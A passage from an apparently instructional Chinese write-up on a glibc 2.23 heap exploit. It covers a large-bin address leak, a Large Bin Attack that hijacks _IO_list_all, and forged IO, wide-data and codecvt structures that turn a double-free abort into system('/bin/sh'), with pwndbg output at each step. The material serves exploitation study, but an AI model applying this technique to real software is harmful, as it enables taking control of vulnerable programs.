    程序首先连续分配三个堆内存块，分别记为`chunk[0]`、`chunk[1]`和`chunk[2]`。其中`chunk[1]`的核心作用是充当物理隔离块，确保`chunk[0]`与`chunk[2]`在内存中不相邻，从而防止它们在后续操作中意外合并。一个关键条件是设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这保证了`chunk[0]`足够大，后续能够被large bin接纳（通常指尺寸不小于1024字节）。

2.  **将块置入Unsorted Bin以植入libc指针**
    接着，释放`chunk[0]`。由于其尺寸超出了fast bin的管理范围，且未与top chunk相邻，它会被放入**unsorted bin**——一个用于临时存放空闲块的双向循环链表。此时，分配器会将`chunk[0]`的`fd`（前向）和`bk`（后向）指针改写，指向glibc的全局管理结构`main_arena`内部的特定地址（例如`main_arena+88`）。这个地址与libc的加载基址之间存在一个已知的固定偏移。

3.  **通过分配请求引导块转入Large Bin**
    随后，程序发起一次新的内存分配，申请一个尺寸大于`chunk[0]`的块`chunk[3]`。由于unsorted bin中唯一的块`chunk[0]`无法满足此次较大的请求，分配器会对其进行整理。鉴于其较大尺寸，`chunk[0]`被从unsorted bin中移除，并依据其大小插入到对应的**large bin**链表中。

4.  **利用Large Bin的特殊指针布局泄露堆地址**
    在large bin链表中，每个空闲块不仅维护着用于双向链表遍历的`fd`和`bk`指针，还包含一对特殊的`fd_nextsize`和`bk_nextsize`指针，用于在不同大小的块之间进行快速跳转。当`chunk[0]`被放入一个**空的large bin**，或成为该尺寸区间内的**首块**时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆内存地址。因此，此刻`chunk[0]`的元数据中同时包含两类关键指针：
    *   `fd`与`bk`：指向`main_arena`内部的地址（**用于计算libc基址**）。
    *   `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆内存地址**）。

5.  **读取并解析以提取关键地址**
    最后，利用程序可能存在的读功能（例如`show(0)`）输出`chunk[0]`用户数据区的内容。由于该块处于释放状态，其用户数据区起始部分已被上述指针覆盖。从输出中可以同时解析出：
    *   从`fd`或`bk`的值推算出`main_arena`地址，减去已知偏移即得**libc基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值直接获得**该堆块所在的堆内存地址**。

通过这一系列模拟正常堆管理行为的操作，在无需任何初始地址信息的情况下，即可同时获取后续利用所依赖的两个核心地址：libc基址和堆内存布局，为紧接着实施**Large Bin Attack**等关键利用步骤奠定了坚实基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x64bf32e3f000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7b1a8798df68
bk: 0x7b1a8798df68
fd_nextsize: 0x64bf32e3f000
bk_nextsize: 0x64bf32e3f000

Allocated chunk
Addr: 0x64bf32e3f430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x64bf32e3f940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x64bf32e3fd50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x64bf32e40260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x64bf32e3f000 —▸ 0x7b1a8798df68 (main_arena+1096) ◂— 0x64bf32e3f000
pwndbg> 
```

在成功获取关键的libc与堆内存地址后，利用流程进入**主动构造阶段**。下一步是利用**Large Bin Attack**原语，在一次堆分配中实现**两次独立的任意地址写**，从而将地址信息转化为对关键内存的实质性控制，为后续利用链铺平道路。

**具体利用步骤与机制如下：**

1.  **准备利用载体**：释放预留的`chunk[2]`。由于其尺寸适中，它被置入**unsorted bin**，成为后续链表操作中待转移的“载体”块（victim）。

2.  **污染Large Bin的链表指针**：利用堆上任意写能力，修改位于**large bin**中的`chunk[0]`的两个后向指针：
    *   将`bk`指针改为`_IO_list_all - 0x10`，目标是劫持全局IO链表头。
    *   将`bk_nextsize`指针改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`），用于向第二个目标地址写入。

3.  **通过分配触发双重写入**：程序申请一个较大的新堆块`chunk[4]`，其大小需**同时大于`chunk[2]`和`chunk[0]`的尺寸**。此条件迫使分配器整理unsorted bin。

    在整理过程中，分配器将`chunk[2]`（victim）从unsorted bin中取出，并尝试按其大小插入`chunk[0]`所在的large bin链表。**此插入操作触发两次关键的链表写入**：
    *   **第一次写入（劫持`_IO_list_all`）**：执行`victim->bk->fd = victim`。由于`victim->bk`为`_IO_list_all - 0x10`，此操作向 **`*_IO_list_all`** 写入`victim`（`chunk[2]`）的堆地址。
    *   **第二次写入（污染辅助目标）**：执行`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入`victim`的堆地址。

**利用达成的双重效果**：
至此，精心布局的Large Bin Attack成功实现：
1.  **核心劫持**：全局IO链表头`_IO_list_all`被劫持，指向可控堆内存（`chunk[2]`），为后续伪造恶意IO结构并劫持控制流创造决定性条件。
2.  **辅助破坏**：在第二个目标地址（`target2 + 0x20`）植入了一个堆地址。通过选择`target2`（如`global_max_fast`），可扰乱堆分配器行为，为利用链提供额外操作空间。

此步骤标志着利用从被动信息收集，正式进入主动篡改全局数据结构、构建恶意执行环境的实质阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x7b1a8798e540 <__GI__IO_list_all>:     0x000064bf32e3f940
pwndbg> x/10gx chunks
0x64bf2e502060 <chunks>:        0x0000000000000020      0x000064bf32e3f010
0x64bf2e502070 <chunks+16>:     0x0000000000000500      0x000064bf32e3f440
0x64bf2e502080 <chunks+32>:     0x0000000000000400      0x000064bf32e3f950
0x64bf2e502090 <chunks+48>:     0x0000000000000500      0x000064bf32e3fd60
0x64bf2e5020a0 <chunks+64>:     0x0000000000000500      0x000064bf32e40270
pwndbg> 
```

在成功将全局指针`_IO_list_all`劫持为指向`chunk[2]`的堆地址后，利用流程进入最关键的**数据结构伪造阶段**。此时，需要在`chunk[2]`的内存中精心构造一个伪造的`_IO_FILE_plus`结构。该结构内多个字段的精确设置旨在协同工作，引导后续的IO处理流程穿越glibc内部的重重检查，最终抵达预设的利用代码。

**关键字段的伪造与利用目的如下：**

1.  **设置`_IO_write_end`与`_IO_write_ptr`以绕过提前返回检查**：
    *   **赋值**：将`_IO_write_end`字段设置为`4`，`_IO_write_ptr`字段设置为`3`。
    *   **利用目的**：此设置旨在针对 **`_IO_wdo_write`** 函数内部的一个关键校验。该函数会检查 `if (fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base)`。此条件若成立，表示缓冲区已满但未完全写入，可能导致函数提前返回，从而中断整个利用链。通过将`_IO_write_end`（4）与`_IO_write_ptr`（3）设为**不同的值**，我们确保该复合条件 **判断为假**，从而成功绕过此检查，阻止执行流在此处提前退出，迫使控制流继续深入至触发字符转换的代码区域。

2.  **设置`_mode`字段以强制选择宽字符处理路径**：
    *   **赋值**：将`_mode`字段明确设置为`1`。
    *   **利用目的**：在后续执行路径中， **`_IO_do_flush`** 是一个条件宏，其行为由`_mode`的值决定：若`_mode <= 0`，则调用`_IO_do_write`处理窄字符流；若`_mode > 0`，则调用`_IO_wdo_write`处理宽字符流。由于我们的整个利用链依赖于伪造的`_IO_codecvt`结构（主要用于宽字符转换），**必须**确保控制流进入`_IO_wdo_write`。将`_mode`设置为`1`（>0）正是为了强制 **`_IO_do_flush`** 宏展开为对 **`_IO_wdo_write`** 的调用，从而将执行流导入预设的宽字符处理路径，这是最终能够触发`__codecvt_do_out`函数指针的必经之路。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x0,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x4,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x64bf32e3f200,
    _wide_data = 0x64bf32e3f030,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x1,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7b1a8798c2a8
}
pwndbg> p/x *(struct _IO_jump_t*)0x7b1a8798c2a8
$2 = {
  __dummy = 0x7b1a87666d64,
  __dummy2 = 0x7b1a8766d997,
  __finish = 0x7b1a8766b2db,
  __overflow = 0x7b1a876677e1,
  __underflow = 0x7b1a87661d6f,
  __uflow = 0x7b1a8766bbf9,
  __pbackfail = 0x7b1a8766bc56,
  __xsputn = 0x7b1a8766b9c0,
  __xsgetn = 0x7b1a8766b1f5,
  __seekoff = 0x7b1a8766bc3d,
  __seekpos = 0x7b1a8766e485,
  __setbuf = 0x7b1a8766e48b,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x7b1a8766810c,
  __stat = 0x7b1a87665d8c,
  __showmanyc = 0x7b1a87665d2d,
  __imbue = 0x7b1a876655fa
}
pwndbg> p/x &_IO_wfile_sync
$3 = 0x7b1a876677e1
pwndbg> 
```

在可控的堆内存区域（例如`chunk0_addr + 0x30`），需要为伪造的`_IO_FILE_plus`结构精心构造其关联的 **`_IO_wide_data`** 结构。此结构内关键指针的设定，旨在与`_IO_FILE`中的`_mode`字段协同，精准操控`_IO_flush_all_lockp`和后续`_IO_wfile_sync`函数的执行路径。

**字段的伪造、条件满足与利用路径引导如下：**

1.  **设置`_IO_write_ptr`与`_IO_write_base`以通过`_IO_flush_all_lockp`检查**：
    *   **赋值**：将`_IO_write_ptr`设置为`0xffffffffffffffff`，`_IO_write_base`设置为`2`。
    *   **利用目的与路径引导**：在 **`_IO_flush_all_lockp`** 函数中，存在一个决定是否调用文件流`_IO_OVERFLOW`的关键复合条件。由于此前已将伪造`_IO_FILE`的`_mode`设为`1`（`>0`），条件中的`(fp->_mode <= 0 && ...)`子句不成立。执行流转而评估另一个子句：
        `(_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))`
        由于`_mode > 0`成立，且我们设置了`_wide_data->_IO_write_ptr`（极大值）远大于`_wide_data->_IO_write_base`（2），此子句**成立**。这导致`_IO_flush_all_lockp`判定该伪造的宽字符流有待刷新数据，从而调用其`_IO_OVERFLOW`函数。由于虚表被设为`_IO_wfile_jumps`，实际执行的是 **`_IO_wfile_sync`**。

2.  **相同的指针设置在`_IO_wfile_sync`中再次生效**：
    *   **利用目的与路径引导**：当控制流进入 **`_IO_wfile_sync`** 函数后，其中一个核心检查是`if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`，用于判断宽字符缓冲区是否有数据需要同步。
    *   得益于在`_IO_wide_data`中预设的相同指针值（`_IO_write_ptr`极大 > `_IO_write_base`），此条件**再次成立**。这使得`_IO_wfile_sync`认为存在待写入的宽字符数据，从而继续调用 **`_IO_do_flush(fp)`** 宏来执行实际的刷新操作。

**总结**：通过对`_IO_wide_data`结构中`_IO_write_ptr`和`_IO_write_base`字段的单一设置，实现了“一石二鸟”的效果：**首先**在`_IO_flush_all_lockp`中触发对伪造流的`_IO_OVERFLOW`（`_IO_wfile_sync`）调用；**接着**在同一结构被`_IO_wfile_sync`函数检查时，再次满足条件，将控制流顺利导入`_IO_do_flush`宏，从而沿着预设的宽字符处理路径继续向最终的利用代码点推进。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x64bf32e3f030
$4 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x2,
  _IO_write_ptr = 0xffffffffffffffff,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x64bf32e3f0e8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x64bf32e3f0e8
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x64bf32e3f128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x64bf32e3f128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg> 
```

在可控的堆内存区域（例如 `chunk0_addr + 0x200`），需要完成利用链的最后一道工序： **伪造一个 `_IO_codecvt` 结构体**。此结构是引导控制流脱离复杂IO处理逻辑、**直接执行任意代码的最终跳板**，其内部两个指针的值决定了利用的成败。

**该伪造结构的具体布局与利用逻辑如下：**

1.  **植入利用代码入口**： **`__codecvt_do_out` 函数指针**
    *   **操作**：将此指针项设置为目标函数的地址。通常是以下二者之一：
        *   **`system` 函数地址**：用于执行任意系统命令。
        *   合适的 **`one_gadget` 地址**：用于直接跳转到libc中可启动shell的现有代码片段。
    *   **利用作用**：在 `_IO_wdo_write` 函数的执行路径中，当需要进行字符集转换时，会调用 **`(*cc->__codecvt_do_out) (cc, ...)`**。由于 `cc` 指针完全由可控（指向此伪造结构），此调用将**毫无意外地跳转**到预设的 `system` 或 `one_gadget` 地址，从而完全掌控程序控制流。

2.  **提供利用代码参数**： **`__codecvt_destr` 指针**
    *   **操作**：将此指针项设置为字符串 **`“/bin/sh”`** 的地址。
    *   **利用作用**：当上述 `__codecvt_do_out` 被调用时，其第一个参数 `cc` 正是这个伪造的 `_IO_codecvt` 结构体的地址。在 `system` 的调用约定中，`cc` 被作为第一个参数（即命令字符串指针）传递。由于将 `__codecvt_destr` 布置在结构体起始位置并设置为 `“/bin/sh”`，因此对 `system(cc)` 的调用，在内存解析上即等同于执行 **`system(“/bin/sh”)`**，从而成功获取shell。

**总结**：此步骤是完成整个复杂利用链的“最终装填”与“击发”准备。通过在可控内存中精确伪造 `_IO_codecvt` 结构，并将其核心函数指针和字符串指针分别指向利用代码与参数，成功将glibc内部一个用于宽字符转换的合法函数调用，劫持并转化为一次可靠、可控的任意命令执行。

```bash
pwndbg> p/x *(struct _IO_codecvt*)0x64bf32e3f200
$5 = {
  __codecvt_destr = 0x68732f6e69622f,
  __codecvt_do_out = 0x7b1a8763c3eb,
  __codecvt_do_unshift = 0x0,
  __codecvt_do_in = 0x0,
  __codecvt_do_encoding = 0x0,
  __codecvt_do_always_noconv = 0x0,
  __codecvt_do_length = 0x0,
  __codecvt_do_max_length = 0x0,
  __cd_in = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x64bf32e3f250
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x64bf32e3f250
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  },
  __cd_out = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x64bf32e3f290
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x64bf32e3f290
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  }
}
pwndbg> x/5i 0x7b1a8763c3eb
   0x7b1a8763c3eb <__libc_system>:      sub    rsp,0x8
   0x7b1a8763c3ef <__libc_system+4>:    test   rdi,rdi
   0x7b1a8763c3f2 <__libc_system+7>:    jne    0x7b1a8763c40a <__libc_system+31>
   0x7b1a8763c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7b1a87756d7b
   0x7b1a8763c3fb <__libc_system+16>:   call   0x7b1a8763be36 <do_system>
pwndbg> x/s 0x64bf32e3f200
0x64bf32e3f200: "/bin/sh"
pwndbg> 
```

整个利用链的最终启动，源于一次精心设计的堆分配器错误触发。**再次释放**已位于large bin中的`chunk[0]`，会立即被glibc检测为**双重释放**。分配器在`_int_free`函数中识别到该异常，随即调用 **`malloc_printerr`** 函数进入错误处理流程。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，以强制刷新所有已打开的IO流。此函数会遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已将该指针劫持为指向`chunk[2]`，因此遍历直接从我们预先伪造的`_IO_FILE_plus`结构开始。

当执行流抵达`chunk[2]`处的伪造结构时，IO层会依据其`_mode`、`_wide_data->_IO_write_ptr`与`_wide_data->_IO_write_base`等字段进行状态判断。得益于前期的精确布局，该伪造结构被识别为一个“有待刷新输出缓冲区”的活跃宽字符文件流。

这一判定导致IO层通过该结构的虚表调用其 **`_IO_OVERFLOW`** 函数。由于我们将虚表指针设置为 **`_IO_wfile_jumps`**，实际执行的是该表中的 **`_IO_wfile_sync`** 函数。

至此，控制流从通用的堆错误处理路径，被无缝导入预设的、以宽字符文件同步为起点的利用链。这标志着利用从复杂的前期布局阶段，正式进入按计划执行的引爆阶段。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7b1a8766de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_sync>
        rdi: 0x64bf32e3f940 ◂— 0
```

当控制流进入 **`_IO_wfile_sync`** 函数后，其内部会判断关联的宽字符文件流是否有待刷新的输出数据。核心判断条件为 `if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`。

由于此前在伪造的`_IO_wide_data`结构中，已将`_IO_write_ptr`设置为`0xffffffffffffffff`，`_IO_write_base`设置为`2`，此比较条件（`0xffffffffffffffff > 2`）**明确成立**。这标志着该伪造流被识别为存在大量未写入的宽字符数据，从而触发后续的实际刷新操作。函数随即调用 **`_IO_do_flush(fp)`** 宏。

`_IO_do_flush`是一个条件宏，其行为由`_mode`字段的值决定：
*   若`_mode <= 0`，则调用`_IO_do_write`处理窄字符流。
*   若`_mode > 0`，则调用`_IO_wdo_write`处理宽字符流。

由于此前已预先将伪造结构的`_mode`字段设置为`1`（`>0`），该宏**确定无疑**地展开为对 **`_IO_wdo_write(fp)`** 的调用。至此，控制流被精确地从文件同步检查逻辑，导入处理宽字符实际写入的核心函数。这是将利用链从通用的IO状态管理转向依赖于伪造`_codecvt`结构（字符转换）的宽字符处理路径的关键转折，为最终触发`__codecvt_do_out`函数指针并执行任意代码铺平了道路。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:506
   500 {
   501   _IO_ssize_t delta;
   502   wint_t retval = 0;
   503 
   504   /*    char* ptr = cur_ptr(); */
   505   if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
 ► 506     if (_IO_do_flush (fp))
 
 ► 0x7b1a87667823 <_IO_wfile_sync+66>    call   _IO_wdo_write               <_IO_wdo_write>
        rdi: 0x64bf32e3f940 ◂— 0
        rsi: 2
        rdx: 0xffffffffffffffff
```

当控制流进入 **`_IO_wdo_write`** 函数后，利用进入最终的执行阶段。函数内部的所有状态判断均依赖于前期精心伪造的数据，确保了执行流将沿预定路径直达目标。

**具体的执行流程与利用控制如下：**

1.  **巨大的`to_do`值确保进入主逻辑**：
    *   函数首先计算待写入的数据量 `to_do`，其值为 `fp->_wide_data->_IO_write_ptr` 与 `fp->_wide_data->_IO_write_base` 之差。由于前期已将 `_IO_write_ptr` 伪造为一个极大值（`0xffffffffffffffff`），`to_do` 的计算结果为一个巨大的正数（如 `0xfffffffffffffffd`），并存储在 `rdx` 寄存器中。
    *   这使得条件判断 `if (to_do > 0)` **恒成立**，执行流必然进入处理实际写入操作的主逻辑分支，不会提前返回。

2.  **绕过缓冲区状态检查，避免执行流中断**：
    *   函数接着检查 `if (fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base)`。此检查旨在识别“缓冲区已满但未完全写入”的状态，若成立可能导致提前返回或无关操作。
    *   在伪造的`_IO_FILE`结构中，我们已将 `_IO_write_end` 设为 `4`，`_IO_write_ptr` 设为 `3`，`_IO_write_base` 设为 `2`。这使得 `_IO_write_end == _IO_write_ptr` 的条件（`4 == 3`）**不成立**，从而**整个复合判断为假**。执行流因此顺利绕过此检查，避免了任何可能中断利用链的旁路。

3.  **抵达最终跳转点，执行任意代码**：
    *   在通过所有内部校验后，执行流抵达预设的终点。在处理宽字符写入时，函数会调用关联的 `_codecvt` 结构执行编码转换，即调用 **`(*cc->__codecvt_do_out) (cc, ...)`**。

由于此前已完全控制 `cc` 所指向的伪造 `_IO_codecvt` 结构，并将 `__codecvt_do_out` 指针设置为 `system` 地址，同时将 `__codecvt_destr` 指向字符串 `“/bin/sh”`，此调用即转化为 **`system(“/bin/sh”)`** 的执行。至此，整个从堆破坏、信息泄露、全局指针劫持到复杂IO结构伪造的精密利用链宣告完成，成功**获取了目标系统的shell控制权**。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:93
    87               write_ptr = fp->_IO_write_ptr;
    88               write_base = fp->_IO_write_base;
    89               buf_end = fp->_IO_buf_end;
    90             }
    91 
    92           /* Now convert from the internal format into the external buffer.  */
 ►  93           result = (*cc->__codecvt_do_out) (cc, &fp->_wide_data->_IO_state,
    94                                             data, data + to_do, &new_data,
    95                                             write_ptr,
    96                                             buf_end,
    97                                             &write_ptr);
 
 ► 0x7b1a876674aa <_IO_wdo_write+167>    call   qword ptr [r15 + 8]         <system>
        command: 0x64bf32e3f200 ◂— 0x68732f6e69622f /* '/bin/sh' */
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
